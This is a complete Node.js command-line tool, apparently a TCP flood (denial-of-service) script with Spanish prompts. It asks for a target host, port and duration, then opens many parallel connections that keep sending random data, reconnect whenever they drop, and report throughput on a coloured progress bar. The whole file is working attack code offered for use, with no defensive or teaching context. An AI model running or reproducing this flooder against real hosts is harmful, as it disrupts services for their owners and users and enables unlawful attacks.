#!/usr/bin/env node
'use strict';

const net      = require('net');
const crypto   = require('crypto');
const readline = require('readline');
const os       = require('os');
const dns      = require('dns').promises;

const rl  = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(r => rl.question(`\x1b[1;32m${q}\x1b[0m`, r));

let target, port, duration, start, cons = 0, bytes = 0, fail = 0;

(async () => {
  target   = await ask('Objetivo 〉 ');
  if (!net.isIP(target)) target = (await dns.resolve4(target))[0];
  port     = parseInt(await ask('Puerto 〉 '));
  duration = parseInt(await ask('Duración (s) 〉 '));

  start = Date.now();
  attack((os.cpus().length || 1) * 16);

  const int = setInterval(() => {
    const el   = (Date.now() - start) / 1000;
    const pct  = Math.min(100, (el / duration) * 100);
    const mbps = (bytes / 1048576 / el).toFixed(1);
    const bar  = '█'.repeat(Math.floor(pct / 3.33)) + '░'.repeat(30 - Math.floor(pct / 3.33));
    process.stdout.write(
      `\r\x1b[38;5;50m${bar}\x1b[0m ` +
      `\x1b[38;5;214m${pct.toFixed(0)}%\x1b[0m ` +
      `\x1b[38;5;82m${mbps} MB/s\x1b[0m ` +
      `\x1b[38;5;223m${(bytes/1048576).toFixed(1)} MB\x1b[0m ` +
      `\x1b[38;5;196m${fail} fail\x1b[0m`
    );
  }, 250);

  setTimeout(() => { clearInterval(int); console.log('\n\x1b[38;5;82m✓\x1b[0m'); process.exit(0); }, duration * 1000);
})().catch(() => process.exit(1));

function attack(threads) {
  for (let i = 0; i < threads; i++) blast();
  function blast() {
    const s = net.connect(port, target, () => { s.setNoDelay(true); flood(s); });
    s.on('error', () => { fail++; s.destroy(); blast(); });
    s.on('close', blast);
  }
}

function flood(socket) {
  const buf = crypto.randomBytes(8192);
  function write() {
    while (socket.write(buf, err => err && fail++)) { cons++; bytes += buf.length; }
    socket.once('drain', write);
  }
  write();
}
